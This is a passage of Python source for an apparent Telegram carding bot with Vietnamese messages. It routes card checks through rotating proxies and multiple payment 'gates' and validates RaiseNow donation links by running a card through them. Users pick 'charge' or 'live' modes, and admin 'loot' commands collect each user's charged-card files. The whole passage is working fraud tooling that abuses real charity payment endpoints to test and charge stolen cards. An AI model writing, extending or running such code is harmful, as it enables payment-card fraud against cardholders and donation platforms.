        with io.BytesIO(message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="stats.txt")
    else:
        await update.message.reply_text(message)


async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/lootfile <user_id>`"); return
    
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"Kh√¥ng t√¨m th·∫•y l·ªãch s·ª≠ check cho ng∆∞·ªùi d√πng `{target_user_id}`."); return
        
    keyboard = [
        [InlineKeyboardButton("1. L·∫•y t·ªáp Charged m·ªõi nh·∫•t", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. L·∫•y t·∫•t c·∫£ t·ªáp Charged", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Ch·ªçn t·ª´ L·ªãch s·ª≠", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ch·ªçn m·ªôt t√πy ch·ªçn ƒë·ªÉ l·∫•y t·ªáp cho ng∆∞·ªùi d√πng `{target_user_id}`:", reply_markup=reply_markup)

# --- PROXY MANAGEMENT COMMANDS ---
async def on_proxy_command(update, context):
    """(Admin) Enable proxy usage mode."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = True
    save_proxies(proxies)
    await update.message.reply_text("‚úÖ Ch·∫ø ƒë·ªô s·ª≠ d·ª•ng proxy ƒë√£ ƒë∆∞·ª£c **B·∫¨T**. C√°c l·∫ßn ki·ªÉm tra th·∫ª gi·ªù s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán qua m·ªôt proxy ng·∫´u nhi√™n.")

async def off_proxy_command(update, context):
    """(Admin) Disable proxy usage mode."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies()
    proxies['enabled'] = False
    save_proxies(proxies)
    await update.message.reply_text("‚òëÔ∏è Ch·∫ø ƒë·ªô s·ª≠ d·ª•ng proxy ƒë√£ ƒë∆∞·ª£c **T·∫ÆT**. C√°c l·∫ßn ki·ªÉm tra s·∫Ω kh√¥ng c√≤n s·ª≠ d·ª•ng proxy n·ªØa.")

async def add_proxy_command(update, context):
    """(Admin) Add a new proxy to the list."""
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/addprx <proxy>`\nV√≠ d·ª•: `/addprx 123.45.67.89:8080` ho·∫∑c `/addprx ip:port:user:pass`")
        return

    proxy_str = context.args[0]
    parts = proxy_str.split(':')
    if len(parts) not in [2, 4]:
        await update.message.reply_text("‚ùå **ƒê·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá.** Vui l√≤ng s·ª≠ d·ª•ng `ip:port` ho·∫∑c `ip:port:user:pass`."); return

    msg = await update.message.reply_text(f"‚è≥ ƒêang ki·ªÉm tra proxy `{proxy_str}`...")
    is_working, reason = await asyncio.to_thread(_test_proxy, proxy_str)

    if not is_working:
        await msg.edit_text(f"‚ùå **Proxy kh√¥ng ho·∫°t ƒë·ªông.**\nL√Ω do: `{reason}`\nProxy kh√¥ng ƒë∆∞·ª£c th√™m v√†o danh s√°ch.")
        return

    proxies = load_proxies()
    if proxy_str in proxies['proxies']:
        await msg.edit_text(f"‚ÑπÔ∏è Proxy `{proxy_str}` ƒë√£ t·ªìn t·∫°i trong danh s√°ch.")
        return
        
    proxies['proxies'].append(proxy_str)
    save_proxies(proxies)
    await msg.edit_text(f"‚úÖ **Proxy ho·∫°t ƒë·ªông v√† ƒë√£ ƒë∆∞·ª£c th√™m!**\n- Proxy: `{proxy_str}`\n- T·ªïng s·ªë proxy c√≥ s·∫µn: `{len(proxies['proxies'])}`")

async def delete_proxy_command(update, context):
    """(Admin) Display the proxy list for deletion."""
    if update.effective_user.id != ADMIN_ID: return
    proxies = load_proxies().get('proxies', [])
    if not proxies:
        await update.message.reply_text("üì≠ Danh s√°ch proxy tr·ªëng.")
        return
    
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {proxy}", callback_data=f"delprx_{i}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Ch·ªçn m·ªôt proxy ƒë·ªÉ x√≥a:", reply_markup=reply_markup)

async def test_proxy_command(update, context):
    """(Admin) Display the proxy list for testing."""
    if update.effective_user.id != ADMIN_ID: return
    proxies_data = load_proxies()
    proxies = proxies_data.get('proxies', [])
    status = "B·∫≠t" if proxies_data.get('enabled') else "T·∫Øt"

    if not proxies:
        await update.message.reply_text(f"üì≠ Danh s√°ch proxy tr·ªëng.\nTr·∫°ng th√°i s·ª≠ d·ª•ng proxy: **{status}**")
        return
    
    keyboard = []
    for i, proxy in enumerate(proxies):
        keyboard.append([InlineKeyboardButton(f"üß™ {proxy}", callback_data=f"testprx_{i}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ch·ªçn m·ªôt proxy ƒë·ªÉ ki·ªÉm tra (k·∫øt n·ªëi ƒë·∫øn google.com):\nTr·∫°ng th√°i s·ª≠ d·ª•ng proxy: **{status}**", reply_markup=reply_markup)

# --- NEW: MULTI-LINK MANAGEMENT COMMANDS ---

async def add_link_command(update, context):
    """(Admin) Adds and validates one or more Raisenow links."""
    if update.effective_user.id != ADMIN_ID: return
    
    text_content = update.message.text.split('/addlink', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("S·ª≠ d·ª•ng: `/addlink <link1>` ho·∫∑c d√°n m·ªôt danh s√°ch c√°c link, m·ªói link m·ªôt d√≤ng.")
        return

    urls = [line.strip() for line in text_content.splitlines() if line.strip()]
    if not urls:
        await update.message.reply_text("Kh√¥ng t√¨m th·∫•y link n√†o ƒë·ªÉ th√™m."); return

    await update.message.reply_text(f"‚è≥ B·∫Øt ƒë·∫ßu qu√° tr√¨nh x√°c th·ª±c cho `{len(urls)}` link. Vi·ªác n√†y c√≥ th·ªÉ m·∫•t m·ªôt l√∫c...")

    success_count = 0
    failed_links = []
    
    for url in urls:
        try:
            parsed_url = urlparse(url)
            if not all([parsed_url.scheme, parsed_url.netloc == 'donate.raisenow.io', parsed_url.path]):
                failed_links.append(f"`{url}` - ƒê·ªãnh d·∫°ng URL kh√¥ng h·ª£p l·ªá.")
                continue
            
            cd = parsed_url.path.strip('/')
            if not cd:
                failed_links.append(f"`{url}` - Kh√¥ng th·ªÉ tr√≠ch xu·∫•t m√£ (cd) t·ª´ URL.")
                continue

            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"üîé ƒêang ki·ªÉm tra link: `{cd}`")

            # --- Validation Step 1: Check for "method_name":"card" ---
            identifier_url = f"https://api.raisenow.io/short-identifiers/{cd}"
            headers = {"User-Agent": random_user_agent()}
            session = requests.Session()
            
            response, error = await asyncio.to_thread(make_request_with_retry, session, 'get', identifier_url, headers=headers)
            
            if error or not response:
                failed_links.append(f"`{cd}` - L·ªói khi l·∫•y th√¥ng tin ƒë·ªãnh danh: {error}")
                continue

            try:
                identifier_data = response.json()
                if not isinstance(identifier_data, dict):
                    failed_links.append(f"`{cd}` - Ph·∫£n h·ªìi ƒë·ªãnh danh kh√¥ng ph·∫£i l√† JSON.")
                    continue
                
                method_name = identifier_data.get("method_name")
                if method_name != "card":
                    failed_links.append(f"`{cd}` - Kh√¥ng h·ªó tr·ª£ th·∫ª (method_name: {method_name}).")
                    continue

                account_uuid = identifier_data.get("account_uuid")
                solution_uuid = identifier_data.get("solution_uuid")
                profile = identifier_data.get("profile")

                if not all([account_uuid, solution_uuid, profile]):
                    failed_links.append(f"`{cd}` - Thi·∫øu UUIDs ho·∫∑c profile trong ph·∫£n h·ªìi.")
                    continue

            except json.JSONDecodeError:
                failed_links.append(f"`{cd}` - L·ªói ph√¢n t√≠ch JSON t·ª´ ph·∫£n h·ªìi ƒë·ªãnh danh.")
                continue
            
            # --- Validation Step 2: Test with a real (test) card ---
            test_card = "4012888818888888|01|28|123" # A test card that should fail
            cc, mes, ano, cvv = test_card.split('|')
            ano_full = f"20{ano}"

            # We create a dummy check function call to see if the payload works
            from checkers.multi_link_checker import check_card_multi_link as test_checker
            
            test_status, _, test_response, _ = await asyncio.to_thread(
                test_checker, session, test_card, cc, mes, ano_full, cvv, {}, None, 
                lambda: {'mode': 'live'}, # Simulate live check
                lambda g, c: 50 # Dummy charge func
            )

            if test_status in ['decline', 'live_success', 'custom']:
                # This is GOOD. It means the API accepted the payload and processed the card.
                link_data = {
                    "cd": cd,
                    "account_uuid": account_uuid,
                    "solution_uuid": solution_uuid,
                    "profile": profile
                }
                
                current_links = load_multi_links()
                # Avoid duplicates
                if not any(d['cd'] == cd for d in current_links):
                    current_links.append(link_data)
                    save_multi_links(current_links)
                    success_count += 1
                    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"‚úÖ **Th√†nh c√¥ng!** Link `{cd}` h·ª£p l·ªá v√† ƒë√£ ƒë∆∞·ª£c th√™m.")
                else:
                    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"‚ÑπÔ∏è Link `{cd}` ƒë√£ t·ªìn t·∫°i trong c∆° s·ªü d·ªØ li·ªáu.")

            elif response.status_code == 400:
                 failed_links.append(f"`{cd}` - Link kh√¥ng h·ªó tr·ª£ payload (L·ªói 400).")
            else:
                 failed_links.append(f"`{cd}` - Th·∫•t b·∫°i ki·ªÉm tra th·ª±c t·∫ø (Tr·∫°ng th√°i: {test_status}, Ph·∫£n h·ªìi: {str(test_response)[:200]})")

        except Exception as e:
            logger.error(f"Error validating link {url}: {e}", exc_info=True)
            failed_links.append(f"`{url}` - L·ªói h·ªá th·ªëng trong qu√° tr√¨nh x√°c th·ª±c: {e}")
        
        await asyncio.sleep(1) # Be nice to the API

    summary_message = f"üèÅ **Ho√†n t·∫•t x√°c th·ª±c!**\n\n- **Th√†nh c√¥ng:** `{success_count}` link ƒë√£ ƒë∆∞·ª£c th√™m.\n- **Th·∫•t b·∫°i:** `{len(failed_links)}` link."
    if failed_links:
        summary_message += "\n\n**C√°c link th·∫•t b·∫°i:**\n" + "\n".join(failed_links)
    
    await update.message.reply_text(summary_message)


async def delete_link_command(update, context):
    """(Admin) Shows the list of saved links for deletion."""
    if update.effective_user.id != ADMIN_ID: return
    
    links = load_multi_links()
    if not links:
        await update.message.reply_text("üì≠ Kh√¥ng c√≥ link n√†o ƒë∆∞·ª£c l∆∞u trong c∆° s·ªü d·ªØ li·ªáu ƒëa link."); return

    keyboard = []
    for i, link_data in enumerate(links):
        cd = link_data.get('cd', 'N/A')
        keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {cd}", callback_data=f"dellink_idx_{i}")])
    
    # Add a "Delete All" button
    keyboard.append([InlineKeyboardButton("üí• X√ìA T·∫§T C·∫¢ LINK üí•", callback_data="dellink_all")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ch·ªçn m·ªôt link ƒë·ªÉ x√≥a (T·ªïng c·ªông: `{len(links)}`):", reply_markup=reply_markup)


async def dalink_command(update, context):
    """(Admin) Sets the bot to the special multi-link check mode."""
    if update.effective_user.id != ADMIN_ID: return

    keyboard = [
        [
            InlineKeyboardButton("üí∞ Charge (ƒêa Link)", callback_data="setdalinkmode_charge"),
            InlineKeyboardButton("‚ö° Check Live (ƒêa Link)", callback_data="setdalinkmode_live"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Vui l√≤ng ch·ªçn m·ªôt ch·∫ø ƒë·ªô cho **üî• Ch·∫ø ƒë·ªô ƒêa Link**:",
        reply_markup=reply_markup
    )


# --- END MULTI-LINK COMMANDS ---


async def button_handler(update, context):
    query = update.callback_query
    
    user_from_callback = query.from_user
    data = query.data.split('_')
    command = data[0]
    
    # --- GATE 1, 2, 3, 5, 8, 9, 10, 11 & 12 MODE SELECTION ---
    if command == "setgate1mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate1_mode(mode)
        set_active_gate('1')
        new_gate_name = get_formatted_gate_name('1')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return

    if command == "setgate2mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate2_mode(mode)
        set_active_gate('2')
        new_gate_name = get_formatted_gate_name('2')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return

    if command == "setgate3mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate3_mode(mode)
        set_active_gate('3')
        new_gate_name = get_formatted_gate_name('3')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return

    if command == "setgate5mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate5_mode(mode)
        set_active_gate('5')
        new_gate_name = get_formatted_gate_name('5')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return

    if command == "setgate8mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate8_mode(mode)
        set_active_gate('8')
        new_gate_name = get_formatted_gate_name('8')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return
        
    if command == "setgate9mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate9_mode(mode)
        set_active_gate('9')
        new_gate_name = get_formatted_gate_name('9')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return

    if command == "setgate10mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate10_mode(mode)
        set_active_gate('10')
        new_gate_name = get_formatted_gate_name('10')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return
        
    if command == "setgate11mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate11_mode(mode)
        set_active_gate('11')
        new_gate_name = get_formatted_gate_name('11')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return

    if command == "setgate12mode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1]
        set_gate12_mode(mode)
        set_active_gate('12')
        new_gate_name = get_formatted_gate_name('12')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return
    
    # --- NEW: Handle Multi-Link mode selection ---
    if command == "setdalinkmode":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        mode = data[1] # 'charge' or 'live'
        set_multi_link_mode(mode)
        set_active_gate('dalink') # Special identifier for multi-link mode
        new_gate_name = get_formatted_gate_name('dalink')
        await query.answer(f"ƒê√£ chuy·ªÉn sang {new_gate_name}")
        await query.edit_message_text(f"‚úÖ ƒê√£ chuy·ªÉn c·ªïng thanh to√°n sang: **{new_gate_name}**")
        return

    # --- NEW: Handle link deletion buttons ---
    if command == "dellink":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        action = data[1]
        if action == "all":
            save_multi_links([])
            await query.answer("ƒê√£ x√≥a t·∫•t c·∫£ c√°c link.")
            await query.edit_message_text("‚úÖ ƒê√£ x√≥a t·∫•t c·∫£ c√°c link kh·ªèi c∆° s·ªü d·ªØ li·ªáu.")
        elif action == "idx":
            try:
                link_index = int(data[2])
                links = load_multi_links()
                if 0 <= link_index < len(links):
                    deleted_link = links.pop(link_index)
                    save_multi_links(links)
                    await query.answer(f"ƒê√£ x√≥a link: {deleted_link.get('cd')}")
                    
                    # Update the button list
                    new_keyboard = []
                    if links:
                        for i, link_data in enumerate(links):
                            cd = link_data.get('cd', 'N/A')
                            new_keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {cd}", callback_data=f"dellink_idx_{i}")])
                        new_keyboard.append([InlineKeyboardButton("üí• X√ìA T·∫§T C·∫¢ LINK üí•", callback_data="dellink_all")])
                        reply_markup = InlineKeyboardMarkup(new_keyboard)
                        await query.edit_message_text(f"ƒê√£ x√≥a. Ch·ªçn link kh√°c ƒë·ªÉ x√≥a (C√≤n l·∫°i: `{len(links)}`):", reply_markup=reply_markup)
                    else:
                        await query.edit_message_text("ƒê√£ x√≥a link cu·ªëi c√πng. Danh s√°ch hi·ªán tr·ªëng.")
                else:
                    await query.answer("L·ªói: Link kh√¥ng c√≤n t·ªìn t·∫°i.", show_alert=True)
            except (ValueError, IndexError) as e:
                logger.error(f"Error deleting link: {e}")
                await query.answer("L·ªói x·ª≠ l√Ω y√™u c·∫ßu.", show_alert=True)
        return

    # --- Handle stop task buttons ---
    if command == "stop":
        await query.answer()
        action = data[1] # 'task' or 'mytask'
        target_user_id = int(data[2])

        if action == "task" and user_from_callback.id == ADMIN_ID:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text(f"‚úÖ ƒê√£ g·ª≠i y√™u c·∫ßu d·ª´ng cho t√°c v·ª• c·ªßa ng∆∞·ªùi d√πng `{target_user_id}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è T√°c v·ª• c·ªßa ng∆∞·ªùi d√πng `{target_user_id}` ƒë√£ k·∫øt th√∫c ho·∫∑c kh√¥ng t·ªìn t·∫°i.", reply_markup=None)
        
        elif action == "mytask" and user_from_callback.id == target_user_id:
            if target_user_id in CANCELLATION_EVENTS:
                CANCELLATION_EVENTS[target_user_id].set()
                await query.edit_message_text("‚è≥ ƒê√£ g·ª≠i y√™u c·∫ßu d·ª´ng. T√°c v·ª• s·∫Ω d·ª´ng l·∫°i ngay...", reply_markup=None)
            else:
                await query.edit_message_text("‚ÑπÔ∏è T√°c v·ª• c·ªßa b·∫°n ƒë√£ k·∫øt th√∫c ho·∫∑c kh√¥ng t·ªìn t·∫°i.", reply_markup=None)
        
        else:
                await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán h√†nh ƒë·ªông n√†y.", show_alert=True)
        return

    # --- HANDLE PROXY BUTTONS (ADMIN ONLY) ---
    if command == "delprx":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            
            if 0 <= proxy_index < len(proxies_data['proxies']):
                deleted_proxy = proxies_data['proxies'].pop(proxy_index)
                save_proxies(proxies_data)
                await query.answer(f"ƒê√£ x√≥a proxy: {deleted_proxy}")
                
                new_keyboard = []
                if proxies_data['proxies']:
                    for i, proxy in enumerate(proxies_data['proxies']):
                        new_keyboard.append([InlineKeyboardButton(f"üóëÔ∏è {proxy}", callback_data=f"delprx_{i}")])
                    reply_markup = InlineKeyboardMarkup(new_keyboard)
                    await query.edit_message_text("ƒê√£ x√≥a. Ch·ªçn proxy kh√°c ƒë·ªÉ x√≥a:", reply_markup=reply_markup)
                else:
                    await query.edit_message_text("ƒê√£ x√≥a proxy cu·ªëi c√πng. Danh s√°ch gi·ªù tr·ªëng.")
            else:
                await query.answer("L·ªói: Proxy kh√¥ng c√≤n t·ªìn t·∫°i.", show_alert=True)
        except (ValueError, IndexError) as e:
            logger.error(f"Error deleting proxy: {e}")
            await query.answer("L·ªói x·ª≠ l√Ω y√™u c·∫ßu.", show_alert=True)
        return

    if command == "testprx":
        if user_from_callback.id != ADMIN_ID: await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn.", show_alert=True); return
        
        try:
            proxy_index = int(data[1])
            proxies_data = load_proxies()
            proxy_to_test = proxies_data['proxies'][proxy_index]
            
            await query.answer(f"ƒêang ki·ªÉm tra {proxy_to_test}...")
            is_working, reason = await asyncio.to_thread(_test_proxy, proxy_to_test)
            
            result_icon = "‚úÖ" if is_working else "‚ùå"
            await query.message.reply_text(f"**K·∫øt qu·∫£ ki·ªÉm tra Proxy:**\n{result_icon} `{proxy_to_test}`\n**L√Ω do:** `{reason}`")
            
        except (ValueError, IndexError) as e:
            logger.error(f"Error testing proxy: {e}")
            await query.answer("L·ªói: Kh√¥ng th·ªÉ t√¨m th·∫•y proxy ƒë·ªÉ ki·ªÉm tra.", show_alert=True)
        return
    
    # --- Other buttons (Admin only) ---
    await query.answer()
    if user_from_callback.id != ADMIN_ID:
        await query.answer("B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán h√†nh ƒë·ªông n√†y.", show_alert=True); return
        
    action = data[1]
    target_user_id = data[2] if len(data) > 2 else None

    if command == "loot":
        if action == "mainmenu":
            keyboard = [
                [InlineKeyboardButton("1. L·∫•y t·ªáp Charged m·ªõi nh·∫•t", callback_data=f"loot_latestcharge_{target_user_id}")],
                [InlineKeyboardButton("2. L·∫•y t·∫•t c·∫£ t·ªáp Charged", callback_data=f"loot_allcharge_{target_user_id}")],
                [InlineKeyboardButton("3. Ch·ªçn t·ª´ L·ªãch s·ª≠", callback_data=f"loot_history_{target_user_id}")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Ch·ªçn m·ªôt t√πy ch·ªçn ƒë·ªÉ l·∫•y t·ªáp cho ng∆∞·ªùi d√πng `{target_user_id}`:", reply_markup=reply_markup)

        elif action == "latestcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
                await query.edit_message_text(f"Kh√¥ng c√≥ l·ªãch s·ª≠ check cho ng∆∞·ªùi d√πng `{target_user_id}`."); return
            
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.edit_message_text(f"‚úÖ ƒê√£ g·ª≠i t·ªáp charged m·ªõi nh·∫•t t·ª´ phi√™n `{latest_session}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è L·∫ßn check g·∫ßn nh·∫•t (`{latest_session}`) kh√¥ng c√≥ th·∫ª n√†o ƒë∆∞·ª£c charge.")

        elif action == "allcharge":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            all_charged_content = []
            if os.path.exists(user_log_dir):
                sessions = sorted(os.listdir(user_log_dir))
                for session_ts in sessions:
                    file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f: all_charged_content.append(f.read())
            
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                with io.BytesIO(combined_content.encode('utf-8')) as file_to_send:
                    filename = f"all_charged_{target_user_id}.txt"
                    await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
                await query.edit_message_text(f"‚úÖ ƒê√£ g·ª≠i m·ªôt t·ªáp k·∫øt h·ª£p t·∫•t c·∫£ c√°c th·∫ª ƒë√£ charge cho ng∆∞·ªùi d√πng `{target_user_id}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è Ng∆∞·ªùi d√πng `{target_user_id}` kh√¥ng c√≥ th·∫ª n√†o ƒë∆∞·ª£c charge trong l·ªãch s·ª≠ c·ªßa h·ªç.")

        elif action == "history":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for session_ts in sessions:
                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path)
                    counts = summary.get('counts', {})
                    try: dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S"); readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
                    except ValueError: readable_ts = session_ts
                    button_text = f"üïí {readable_ts} - ‚úÖ{counts.get('success',0)} ‚ùå{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
            
            keyboard.append([InlineKeyboardButton("¬´ Quay l·∫°i Menu ch√≠nh", callback_data=f"loot_mainmenu_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"üìú **L·ªãch s·ª≠ check c·ªßa ng∆∞·ªùi d√πng `{target_user_id}`:**", reply_markup=reply_markup)

        elif action == "session":
            _, _, target_user_id, session_ts = data
            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
            if not files:
                await query.edit_message_text("Phi√™n n√†y kh√¥ng c√≥ t·ªáp k·∫øt qu·∫£."); return
            keyboard = []
            for filename in files:
                keyboard.append([InlineKeyboardButton(f"T·∫£i xu·ªëng {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
            keyboard.append([InlineKeyboardButton("¬´ Quay l·∫°i L·ªãch s·ª≠", callback_data=f"loot_history_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Ch·ªçn m·ªôt t·ªáp ƒë·ªÉ t·∫£i xu·ªëng t·ª´ phi√™n `{session_ts}`:", reply_markup=reply_markup)

        elif action == "getfile":
            _, _, target_user_id, session_ts, filename = data
            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.answer(f"ƒê√£ g·ª≠i t·ªáp {filename}")
            else:
                await query.answer("‚ùå L·ªói: Kh√¥ng t√¨m th·∫•y t·ªáp.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # General commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    
    # Admin commands
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("setgate", set_gate_range_command))
    application.add_handler(CommandHandler("on", turn_bot_on))
    application.add_handler(CommandHandler("off", turn_bot_off))
    application.add_handler(CommandHandler("send", send_message_command))
    application.add_handler(CommandHandler("sendall", send_all_command))
    application.add_handler(CommandHandler("active", active_checks_command)) 

    # --- NEW: Multi-Link Admin Commands ---
    application.add_handler(CommandHandler("addlink", add_link_command))
    application.add_handler(CommandHandler("deletelink", delete_link_command))
    application.add_handler(CommandHandler("dalink", dalink_command))

    # PROXY COMMANDS
    application.add_handler(CommandHandler("onprx", on_proxy_command))
    application.add_handler(CommandHandler("offprx", off_proxy_command))
    application.add_handler(CommandHandler("addprx", add_proxy_command))
    application.add_handler(CommandHandler("deleteprx", delete_proxy_command))
    application.add_handler(CommandHandler("testprx", test_proxy_command))
    
    # Check commands
    application.add_handler(MessageHandler(filters.Regex(r'^/cs(\d+)'), cs_custom_amount_command))
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("multi", multi_check_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    # Site Checker commands
    application.add_handler(CommandHandler("site", site_command))
    application.add_handler(CommandHandler("sitem", sitem_command))

    # Button handler
